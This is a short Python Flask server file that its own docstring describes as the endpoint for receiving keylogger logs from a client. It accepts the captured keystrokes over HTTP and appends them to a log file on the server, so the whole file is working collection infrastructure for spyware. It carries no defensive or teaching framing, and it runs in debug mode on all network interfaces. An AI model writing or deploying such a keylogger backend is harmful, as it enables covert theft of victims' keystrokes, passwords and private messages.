from flask import Flask, request, jsonify

app = Flask(__name__)

LOG_FILE = "server_log.txt"  # The file where logs will be stored on the server

@app.route('/upload', methods=['POST'])
def receive_log():
    """
    API endpoint to receive keylogger logs from the client.
    Saves the log data to a file on the server.
    """
    try:
        data = request.json  # Get JSON data from request
        if "log" in data:
            with open(LOG_FILE, "a") as file:
                file.write(data["log"] + "\n")  # Append logs to server file

            return jsonify({"message": "Log received successfully"}), 200
        else:
            return jsonify({"error": "Invalid request format"}), 400
    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=5000, debug=True)  # Run server on all network interfaces
